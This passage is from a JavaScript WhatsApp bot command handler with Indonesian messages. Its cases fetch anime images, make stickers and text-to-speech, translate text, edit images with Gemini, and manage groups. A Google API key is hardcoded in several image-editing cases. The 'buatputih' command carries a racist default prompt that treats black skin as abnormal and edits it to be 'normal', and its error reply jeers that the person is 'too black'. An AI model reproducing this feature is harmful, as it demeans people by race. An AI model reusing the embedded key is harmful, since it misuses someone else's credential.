break
case 'animefoxgirl':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/foxgirl`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animetickle': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            await Kyyhst.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animegecg': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            await Kyyhst.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'dogwoof': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            await Kyyhst.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case '8ballpool': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            await Kyyhst.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'goosebird': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            await Kyyhst.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animefeed': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            await Kyyhst.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeavatar': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            await Kyyhst.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'lizardpic': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            await Kyyhst.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'catmeow': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            await Kyyhst.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
    /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 ANIME 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/







//============================================================\\
    //  𝗖 𝗢 𝗡 𝗩 𝗘 𝗥 𝗧  -         𝗠 𝗘 𝗡 𝗨
//============================================================\\
 case "brat": {
          if (!text) return m.reply(`*\`ᴄᴏɴᴛᴏʜ ᴘᴇɴɢɢᴜɴᴀᴀɴ\`*:\n${prefix+command} halo suki`) 
                                               try {
                                                       await Kyyhst.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
                                                               const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false`;
                                                                       const response = await axios.get(url, { responseType: "arraybuffer" });
                                                                               const sticker = new Sticker(response.data, {
                                                                                           pack: "Stiker By",
                                                                                                       author: "Kythst 444+",
                                                                                                                   type: "image/png",
                                                                                                                           });
                                                                                                                                   const stikerBuffer = await sticker.toBuffer();
                                                                                                                                           await Kyyhst.sendMessage(m.chat, { sticker: stikerBuffer }, { quoted: m });
                                                                                                                                               } catch (err) {
                                                                                                                                                       console.error("Error:", err);
                                                                                                                                                               await Kyyhst.sendMessage(m.chat, {
                                                                                                                                                                           text: "Maaf, terjadi kesalahan saat mencoba membuat stiker brat. Coba lagi nanti.",
                                                                                                                                                                                   }, { quoted: m });
                                                                                                                                                                                       }
                                                                                                                                                                                      
                                                                                                                                                                                      }
                                                                                          break 
                                                                                           case "bratvid": {
          if (!text) return m.reply(`*\`ᴄᴏɴᴛᴏʜ ᴘᴇɴɢɢᴜɴᴀᴀɴ\`*:\n${prefix+command} halo suki`) 
                                               try {
                                                       await Kyyhst.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
                                                               const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=true`;
                                                                       const response = await axios.get(url, { responseType: "arraybuffer" });
                                                                               const sticker = new Sticker(response.data, {
                                                                                           pack: "Stiker By",
                                                                                                       author: "Kyyhst 444+",
                                                                                                                   type: "image/png",
                                                                                                                           });
                                                                                                                                   const stikerBuffer = await sticker.toBuffer();
                                                                                                                                           await Kyyhst.sendMessage(m.chat, { sticker: stikerBuffer }, { quoted: m });
                                                                                                                                               } catch (err) {
                                                                                                                                                       console.error("Error:", err);
                                                                                                                                                               await Kyyhst.sendMessage(m.chat, {
                                                                                                                                                                           text: "Maaf, terjadi kesalahan saat mencoba membuat stiker brat. Coba lagi nanti.",
                                                                                                                                                                                   }, { quoted: m });
                                                                                                                                                                                       }
                                                                                                                                                                                      
                                                                                                                                                                                      }                                                                                   
break
case 'animebrat': {
    if (!text) return m.reply('Masukkan teks untuk stiker.');
  const axios = require('axios')
  const { createCanvas, loadImage, registerFont } = require('canvas')
  const sharp = require('sharp')
    try {
        let imageUrl = 'https://cloudkuimages.com/uploads/images/67ddbbcb065a6.jpg';
        let fontUrl = 'https://github.com/googlefonts/noto-emoji/raw/main/fonts/NotoColorEmoji.ttf';
        let imagePath = path.join(__dirname, 'session', 'file.jpg');
        let fontPath = path.join(__dirname, 'session', 'NotoColorEmoji.ttf');
        let outputMp4 = path.join(__dirname, 'session', `output_${Date.now()}.mp4`);
        let outputWebP = path.join(__dirname, 'session', `animated_${Date.now()}.webp`);
        let frameDir = path.join(__dirname, 'session', `frames_${Date.now()}`);

        if (!fs.existsSync(frameDir)) fs.mkdirSync(frameDir);

        if (!fs.existsSync(fontPath)) {
            let fontData = await axios.get(fontUrl, { responseType: 'arraybuffer' });
            fs.writeFileSync(fontPath, Buffer.from(fontData.data));
        }

        let response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
        fs.writeFileSync(imagePath, Buffer.from(response.data));

        let baseImage = await loadImage(imagePath);
        let canvas = createCanvas(baseImage.width, baseImage.height);
        let ctx = canvas.getContext('2d');

        require('canvas').registerFont(fontPath, { family: 'EmojiFont' });

        let boardX = canvas.width * 0.22;
        let boardY = canvas.height * 0.50;
        let boardWidth = canvas.width * 0.56;
        let boardHeight = canvas.height * 0.25;

        ctx.fillStyle = '#000';
        ctx.textAlign = 'center';
        ctx.textBaseline = 'middle';

        let maxFontSize = 32;
        let minFontSize = 12;
        let fontSize = maxFontSize;

        function isTextFit(text, fontSize) {
            ctx.font = `bold ${fontSize}px EmojiFont`;
            let words = text.split(' ');
            let lineHeight = fontSize * 1.2;
            let maxWidth = boardWidth * 0.9;
            let lines = [];
            let currentLine = words[0];

            for (let i = 1; i < words.length; i++) {
                let testLine = currentLine + ' ' + words[i];
                let testWidth = ctx.measureText(testLine).width;
                if (testWidth > maxWidth) {
                    lines.push(currentLine);
                    currentLine = words[i];
                } else {
                    currentLine = testLine;
                }
            }
            lines.push(currentLine);
            let textHeight = lines.length * lineHeight;
            return textHeight <= boardHeight * 0.9;
        }

        while (!isTextFit(text, fontSize) && fontSize > minFontSize) {
            fontSize -= 2;
        }

        ctx.font = `bold ${fontSize}px EmojiFont`;

        let words = text.split(' ');
        let lineHeight = fontSize * 1.2;
        let maxWidth = boardWidth * 0.9;
        let frames = [];

        for (let i = 1; i <= words.length; i++) {
            let tempText = words.slice(0, i).join(' ');
            let frameCanvas = createCanvas(baseImage.width, baseImage.height);
            let frameCtx = frameCanvas.getContext('2d');

            frameCtx.drawImage(baseImage, 0, 0, frameCanvas.width, frameCanvas.height);
            frameCtx.fillStyle = '#000';
            frameCtx.textAlign = 'center';
            frameCtx.textBaseline = 'middle';
            frameCtx.font = `bold ${fontSize}px EmojiFont`;

            let lines = [];
            let currentLine = '';
            tempText.split(' ').forEach((word) => {
                let testLine = currentLine ? currentLine + ' ' + word : word;
                let testWidth = frameCtx.measureText(testLine).width;
                if (testWidth > maxWidth) {
                    lines.push(currentLine);
                    currentLine = word;
                } else {
                    currentLine = testLine;
                }
            });
            lines.push(currentLine);

            let startY = boardY + boardHeight / 2 - (lines.length - 1) * lineHeight / 2;
            lines.forEach((line, index) => {
                frameCtx.fillText(line, boardX + boardWidth / 2, startY + index * lineHeight);
            });

            let framePath = path.join(frameDir, `frame${i}.png`);
            fs.writeFileSync(framePath, frameCanvas.toBuffer('image/png'));
            frames.push(framePath);
        }

        exec(`ffmpeg -y -framerate 2 -i ${frameDir}/frame%d.png -c:v libx264 -pix_fmt yuv420p ${outputMp4}`, async (err) => {
            if (err) {
                console.error("❌ Error membuat video:", err);
                return m.reply("Terjadi kesalahan saat membuat video animasi.");
            }

            exec(`ffmpeg -i ${outputMp4} -vf "scale=512:512:flags=lanczos,format=rgba" -loop 0 -preset default -an -vsync 0 ${outputWebP}`, async (err) => {
                if (err) {
                    console.error("❌ Error konversi video ke stiker:", err);
                    return m.reply("Terjadi kesalahan saat mengonversi video ke stiker.");
                }

                Kyyhst.sendMessage(m.chat, { sticker: { url: outputWebP } }, { quoted: m });

                setTimeout(() => {
                    fs.unlinkSync(imagePath);
                    fs.unlinkSync(outputMp4);
                    fs.unlinkSync(outputWebP);
                    fs.rmSync(frameDir, { recursive: true, force: true });
                }, 5000);
            });
        });

    } catch (e) {
        console.error(e);
        m.reply('⚠️ Terjadi kesalahan saat membuat stiker.');
    }
}
break;
  case "tts": {
  if(!text) return m.reply(`Masukan Text`);
  m.reply(mess.wait);
  try {
    let anu = `https://api.siputzx.my.id/api/tools/tts?text=${encodeURIComponent(text)}&voice=jv-ID-DimasNeural&rate=0%&pitch=0Hz&volume=0%`;
    const response = await axios.get(anu, {
      responseType: 'arraybuffer'
    });
    let buffer = response.data;
    
    Kyyhst.sendMessage(m.chat, {
      audio: buffer,
      mimetype: "audio/mpeg",
      ptt: true
    })
  } catch (err) {
    console.log(err);
    return err;
  }
}
break;
case 's': case 'stiker': case 'sticker': {
	 
    if (/image|video|webp/i.test(quoted.mime)) {
        const buffer = await quoted.download()
        const filePath = path.join(__dirname, './temp.jpg');
        const stickerPath = path.join(__dirname, './sticker.webp');

        writeFileSync(filePath, buffer);
        
        try {
            await sharp(filePath)
                .resize(512, 512, { fit: 'contain', background: { r: 0, g: 0, b: 0, alpha: 0 } })
                .toFormat('webp')
                .toFile(stickerPath);

            const stickerBuffer = readFileSync(stickerPath);
            await Kyyhst.sendMessage(m.chat, { sticker: stickerBuffer }, { quoted: m });

            unlinkSync(filePath);
            unlinkSync(stickerPath);
        } catch (e) {
            console.log(error)
        }
    } else if (/(https?:\/\/.*\.(?:png|jpg|jpeg|webp|mov|mp4|webm|gif))/i.test(m.text)) {
        m.reply("wait")
        await Kyyhst.sendMessage(m.chat, { sticker: Func.isUrl(m.text)[0] });
        
    } else {
        m.reply(`Method Not Support`)
    }
    break
}
case "pastebin": case "getpastebin": {
if (!q) return m.reply("Mana Link Pastebinnya")
try {
const anu = await axios.get(`https://api.hiuraa.my.id/tools/getpastebin?url=${encodeURIComponent(q)}`)
m.reply(anu.data.result.content)
} catch (err) {
m.reply("Terjadi Kesalahan: " + err)
}
}
break;
case "tr": case "translate": {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return m.reply(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return m.reply(example("id good night"))
if (args.length < 1) return m.reply(example("id good night"))
if (!m.quoted.text) return m.reply(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return m.reply(example("id good night"))
}}
break
case 'hijabkan': case 'tohijab': {
    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || "";
    let defaultPrompt = "Buatkan Karakter Yang Ada Di Gambar Tersebut Agar Diberikan Hijab Warna Putih Hijab Ala Orang Indonesia Dan Jangan Sampai Rambutnya Terlihat, Semua Tertutup";
    if (!mime) {
        m.reply("Tidak ada gambar yang direply, membuat gambar default...");
        mime = "image/png";
        q = { msg: { mimetype: mime }, download: async () => fs.readFileSync("default_image.png") };
    }
    if (!/image\/(jpe?g|png)/.test(mime)) return m.reply(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png`);
    let promptText = text || defaultPrompt;
    m.reply("Otw Di Hijabkan...");
    try {
        let imgData = await q.download();
        let genAI = new GoogleGenerativeAI("AIzaSyDWxXKqqaz3Ypv7rW2j9Fhn2TNYazTOUCI");
        const base64Image = imgData.toString("base64");
        const contents = [
            { text: promptText },
            {
                inlineData: {
                    mimeType: mime,
                    data: base64Image
                }
            }
        ];
        const model = genAI.getGenerativeModel({
            model: "gemini-2.0-flash-exp-image-generation",
            generationConfig: {
                responseModalities: ["Text", "Image"]
            },
        });
        const response = await model.generateContent(contents);
        let resultImage;
        let resultText = "";
        for (const part of response.response.candidates[0].content.parts) {
            if (part.text) {
                resultText += part.text;
            } else if (part.inlineData) {
                const imageData = part.inlineData.data;
                resultImage = Buffer.from(imageData, "base64");
            }
        }
        if (resultImage) {
            const tmpDir = path.join(process.cwd(), "tmp");
            if (!fs.existsSync(tmpDir)) {
                fs.mkdirSync(tmpDir, { recursive: true });
            }
            let tempPath = path.join(tmpDir, `gemini_${Date.now()}.png`);
            fs.writeFileSync(tempPath, resultImage);
            await Kyyhst.sendMessage(m.chat, { 
                image: { url: tempPath },
                caption: `*tuh*`
            }, { quoted: m });
            setTimeout(() => {
                try {
                    fs.unlinkSync(tempPath);
                } catch (err) {
                    console.error("Failed to delete temp file:", err);
                }
            }, 30000);
        } else {
            m.reply("Gagal Di Hijabkan Dosa Nya Ke gedean Ini Mah.");
        }
    } catch (error) {
        console.error(error);
        m.reply(`Error: ${error.message}`);
    }
}
break
case 'aiedit': case 'editai': {
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || "";
 if (!text) {
 return m.reply("Harap masukkan prompt custom!\n\nContoh: aiedit buatkan foto itu lebih estetik.");
 }
 if (!mime) {
 return m.reply("Tidak ada gambar yang direply! Silakan reply gambar dengan format jpg/png.");
 }
 if (!/image\/(jpe?g|png)/.test(mime)) {
 return m.reply(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png.`);
 }
 m.reply("Otw diedit sesuai permintaan...");
 try {
 let imgData = await q.download();
 let genAI = new GoogleGenerativeAI("AIzaSyDWxXKqqaz3Ypv7rW2j9Fhn2TNYazTOUCI");
 const base64Image = imgData.toString("base64");
 const contents = [
 { text: text }, 
 {
 inlineData: {
 mimeType: mime,
 data: base64Image
 }
 }
 ];
 const model = genAI.getGenerativeModel({
 model: "gemini-2.0-flash-exp-image-generation",
 generationConfig: {
 responseModalities: ["Text", "Image"]
 },
 });
 const response = await model.generateContent(contents);
 let resultImage;
 let resultText = "";
 for (const part of response.response.candidates[0].content.parts) {
 if (part.text) {
 resultText += part.text;
 } else if (part.inlineData) {
 const imageData = part.inlineData.data;
 resultImage = Buffer.from(imageData, "base64");
 }
 }
 if (resultImage) {
 const tmpDir = path.join(process.cwd(), "tmp");
 if (!fs.existsSync(tmpDir)) {
 fs.mkdirSync(tmpDir, { recursive: true });
 }
 let tempPath = path.join(tmpDir, `gemini_${Date.now()}.png`);
 fs.writeFileSync(tempPath, resultImage);
 await Kyyhst.sendMessage(m.chat, { 
 image: { url: tempPath },
 caption: `*Edit selesai sesuai permintaan!*`
 }, { quoted: m });
 
 setTimeout(() => {
 try {
 fs.unlinkSync(tempPath);
 } catch (err) {
 console.error("Gagal menghapus file sementara:", err);
 }
 }, 30000);
 } else {
 m.reply("Gagal memproses gambar.");
 }
 } catch (error) {
 console.error(error);
 m.reply(`Error: ${error.message}`);
 }
}
break
case 'buatputih': case 'putihkan': case 'toputih':{
    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || "";
    let defaultPrompt = "Buat kulit yang berwarna hitam menjadi warna normal seperti manusia";
    if (!mime) {
        m.reply("Tidak ada gambar yang direply, membuat gambar default...");
        mime = "image/png";
        q = { msg: { mimetype: mime }, download: async () => fs.readFileSync("default_image.png") };
    }
    if (!/image\/(jpe?g|png)/.test(mime)) return m.reply(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png`);
    let promptText = text || defaultPrompt;
    m.reply("Otw...");
    try {
        let imgData = await q.download();
        let genAI = new GoogleGenerativeAI("AIzaSyDWxXKqqaz3Ypv7rW2j9Fhn2TNYazTOUCI");
        const base64Image = imgData.toString("base64");
        const contents = [
            { text: promptText },
            {
                inlineData: {
                    mimeType: mime,
                    data: base64Image
                }
            }
        ];
        const model = genAI.getGenerativeModel({
            model: "gemini-2.0-flash-exp-image-generation",
            generationConfig: {
                responseModalities: ["Text", "Image"]
            },
        });
        const response = await model.generateContent(contents);
        let resultImage;
        let resultText = "";
        for (const part of response.response.candidates[0].content.parts) {
            if (part.text) {
                resultText += part.text;
            } else if (part.inlineData) {
                const imageData = part.inlineData.data;
                resultImage = Buffer.from(imageData, "base64");
            }
        }
        if (resultImage) {
            const tmpDir = path.join(process.cwd(), "tmp");
            if (!fs.existsSync(tmpDir)) {
                fs.mkdirSync(tmpDir, { recursive: true });
            }
            let tempPath = path.join(tmpDir, `gemini_${Date.now()}.png`);
            fs.writeFileSync(tempPath, resultImage);
            await Kyyhst.sendMessage(m.chat, { 
                image: { url: tempPath },
                caption: `*tuh*`
            }, { quoted: m });
            setTimeout(() => {
                try {
                    fs.unlinkSync(tempPath);
                } catch (err) {
                    console.error("Failed to delete temp file:", err);
                }
            }, 30000);
        } else {
            m.reply("Maaf Itu Udh Terlalu Itam.");
        }
    } catch (error) {
        console.error(error);
        m.reply(`Error: ${error.message}`);
    }
}
break
    /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗖𝗢𝗡𝗩𝗘𝗥𝗧 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/







//============================================================\\
    //  𝗚 𝗥 𝗢 𝗨 𝗣     -         𝗠 𝗘 𝗡 𝗨
//============================================================\\
      case 'closetime':
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator)
          return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        if (args[1] == "detik") {
          var timer = args[0] * `1000`;
        } else if (args[1] == "menit") {
          var timer = args[0] * `60000`;
        } else if (args[1] == "jam") {
          var timer = args[0] * `3600000`;
        } else if (args[1] == "hari") {
          var timer = args[0] * `86400000`;
        } else {
          return m.reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik");
        }
        m.reply(`Close time ${q} dimulai dari sekarang`);
        setTimeout(() => {
          var nomor = m.participant;
          const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`;
          Kyyhst.groupSettingUpdate(m.chat, "announcement");
          m.reply(close);
        }, timer);
        break;
      case 'opentime':
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator)
          return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        if (args[1] == "detik") {
          var timer = args[0] * `1000`;
        } else if (args[1] == "menit") {
          var timer = args[0] * `60000`;
        } else if (args[1] == "jam") {
          var timer = args[0] * `3600000`;
        } else if (args[1] == "hari") {
          var timer = args[0] * `86400000`;
        } else {
          return m.reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik");
        }
        m.reply(`Open time ${q} dimulai dari sekarang`);
        setTimeout(() => {
          var nomor = m.participant;
          const open = `*Tepat waktu* grup dibuka oleh admin\n sekarang member dapat mengirim pesan`;
          Kyyhst.groupSettingUpdate(m.chat, "not_announcement");
          m.reply(open);
        }, timer);
        break;
      case 'kick':
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator)
          return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        let blockwww = m.mentionedJid[0]
          ? m.mentionedJid[0]
          : m.quoted
          ? m.quoted.sender
          : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await Kyyhst
          .groupParticipantsUpdate(m.chat, [blockwww], "remove")
          .then((res) => m.reply(json(res)))
          .catch((err) => m.reply(json(err)));
        break;
      case 'promote':
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator)
          return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        let blockwwwww = m.mentionedJid[0]
          ? m.mentionedJid[0]
          : m.quoted
          ? m.quoted.sender
          : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await Kyyhst
          .groupParticipantsUpdate(m.chat, [blockwwwww], "promote")
          .then((res) => m.reply(json(res)))
          .catch((err) => m.reply(json(err)));
        break;
      case 'demote':
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator)
          return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        let blockwwwwwa = m.mentionedJid[0]
          ? m.mentionedJid[0]
          : m.quoted
          ? m.quoted.sender
          : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await Kyyhst
          .groupParticipantsUpdate(m.chat, [blockwwwwwa], "demote")
          .then((res) => m.reply(json(res)))
          .catch((err) => m.reply(json(err)));
        break;
      case 'setname':
      case 'setsubject':
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator)
          return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        if (!text) return reply(`text?`) 
        await Kyyhst
          .groupUpdateSubject(m.chat, text)
          .then((res) => m.reply(mess.success))
          .catch((err) => m.reply(json(err)));
        break;
      case 'setdesc':
      case 'setdesk':
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator)
          return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        if (!text) return reply(`text?`) 
        await Kyyhst
          .groupUpdateDescription(m.chat, text)
          .then((res) => m.reply(mess.success))
          .catch((err) => m.reply(json(err)));
        break;
      case 'setppgroup':
      case 'setppgrup':
      case 'setppgc':
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator)
          return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        if (!quoted)
          return m.reply(
            `Kirim/m.reply Image Dengan Caption ${prefix + command}`,
          );
        if (!/image/.test(mime))
          return m.reply(
            `Kirim/m.reply Image Dengan Caption ${prefix + command}`,
          );
        if (/webp/.test(mime))
          return m.reply(
            `Kirim/m.reply Image Dengan Caption ${prefix + command}`,
          );
        var medis = await Kyyhst.downloadAndSaveMediaMessage(
          quoted,
          "ppbot.jpeg",
        );
        if (args[0] == "full") {
          var { img } = await generateProfilePicture(medis);
          await Kyyhst.query({
            tag: "iq",
            attrs: {
              to: m.chat,
              type: "set",
              xmlns: "w:profile:picture",
            },
            content: [
              {
                tag: "picture",
                attrs: {
                  type: "image",
                },
                content: img,
              },
            ],
          });
          fs.unlinkSync(medis);
          m.reply(mess.done);
        } else {
          var memeg = await Kyyhst.updateProfilePicture(m.chat, {
            url: medis,
          });
          fs.unlinkSync(medis);
          m.reply(mess.done);
        }
        break;
      case 'tagall':
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator)
          return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        let teks = `ダ TAG BY ADMIN ダ
 
                  *MESSAGE: ${q ? q : "kosong"}*\n\n`;
        for (let mem of participants) {
          teks += `◈ @${mem.id.split("@")[0]}\n`;
        }
        Kyyhst.sendMessage(
          m.chat,
          {
            text: teks,
            mentions: participants.map((a) => a.id),
          },
          {
            quoted: m,
          },
        );
        break;
      case 'hidetag':
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator)
          return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        Kyyhst.sendMessage(
          m.chat,
          {
            text: q ? q : "",
            mentions: participants.map((a) => a.id),
          },
          {
            quoted: m,
          },
        );
        break;
      case 'totag':
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator)
          return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        if (!m.quoted)
          return m.reply(`Reply pesan dengan caption ${prefix + command}`);
        Kyyhst.sendMessage(m.chat, {
          forward: m.quoted.fakeObj,
          mentions: participants.map((a) => a.id),
        });
        break;
      case 'group':
      case 'grup':
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator)
          return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        if (args[0] === "close") {
          await Kyyhst
            .groupSettingUpdate(m.chat, "announcement")
            .then((res) => m.reply(`Sukses Menutup Group 🕊️`))
            .catch((err) => m.reply(json(err)));
        } else if (args[0] === "open") {
          await Kyyhst
            .groupSettingUpdate(m.chat, "not_announcement")
            .then((res) => m.reply(`Sukses Membuka Group 🕊️`))
            .catch((err) => m.reply(json(err)));
        } else {
          m.reply(`Mode ${command}\n\n\nKetik ${prefix + command}open/close`);
        }
        break;
      case 'linkgroup':
      case 'linkgrup':
      case 'linkgc':
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator)
          return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        let response = await Kyyhst.groupInviteCode(m.chat);
        Kyyhst.sendText(
          m.chat,
          `👥 *INFO LINK GROUP*\n📛 *Nama :* ${
            groupMetadata.subject
          }\n👤 *Owner Grup :* ${
            groupMetadata.owner !== undefined
              ? "@" + groupMetadata.owner.split`@`[0]
              : "Tidak diketahui"
          }\n🌱 *ID :* ${
            groupMetadata.id
          }\n🔗 *Link Chat :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${
            groupMetadata.participants.length
          }\n`,
          m,
          {
            detectLink: true,
          },
        );
        break;
      case 'revoke':
      case 'resetlink':
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator)
          return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        await Kyyhst
          .groupRevokeInvite(m.chat)
          .then((res) => {
            m.reply(
              `Sukses Menyetel Ulang, Tautan Undangan Grup ${groupMetadata.subject}`,
            );
          })
          .catch((err) => m.reply(json(err)));
        break;
case "welcome":
{
if (!isCreator) return m.reply('*khusus Premium*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
var groupe = await Kyyhst.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyyhst.sendMessage(from, {text: `Fitur Welcome Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
m.reply('Sukses Mematikan Welcome  di group ini')
}
}
break
case 'antivirus': case 'antivirtex': {
if (!m.isGroup) return reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isCreator) return reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiVirtex) return reply('_Sudah Diaktifkan_')
ntvirtex.push(m.chat)
fs.writeFileSync('./system/Database/Antilink/antivirus.json', JSON.stringify(ntvirtex))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Kyyhst.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyyhst.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTidak ada orang yang diperbolehkan mengirim virus di grup ini, anggota yang mengirim akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiVirtex) return reply('_Sudah Dimatikan_')
let off = ntvirtex.indexOf(m.chat)
ntvirtex.splice(off, 1)
fs.writeFileSync('./system/Database/Antilink/antivirus.json', JSON.stringify(ntvirtex))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
if (!m.isGroup) return reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isCreator) return reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return reply('_Sudah Diaktifkan_')
ntilinkytvid.push(m.chat)
fs.writeFileSync('./system/Database/Antilink/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
